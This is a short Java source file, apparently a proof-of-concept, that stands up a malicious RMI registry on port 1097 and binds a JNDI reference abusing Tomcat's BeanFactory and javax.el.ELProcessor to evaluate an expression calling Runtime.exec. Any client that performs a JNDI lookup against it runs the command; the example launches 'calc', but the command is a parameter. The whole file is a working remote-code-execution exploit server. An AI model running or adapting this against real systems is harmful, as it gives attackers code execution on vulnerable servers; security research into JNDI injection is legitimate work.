package com.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {

    public static void main(String[] args) {
        new EvilRMIServer().start();
    }

    public void start() {
        try {
            System.out.println("Creating evil RMI registry on port 1097");
            Registry registry = LocateRegistry.createRegistry(1097);

            ReferenceWrapper rw = new ReferenceWrapper(execByEL("calc"));
            registry.bind("Cal", rw);

            /*
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL, "rmi://localhost:1097");

            InitialContext ictx = new InitialContext(env);
            */

            System.out.println("Server ready");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public ResourceRef execByEL(String command) {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                command
        )));
        return ref;
    }
}
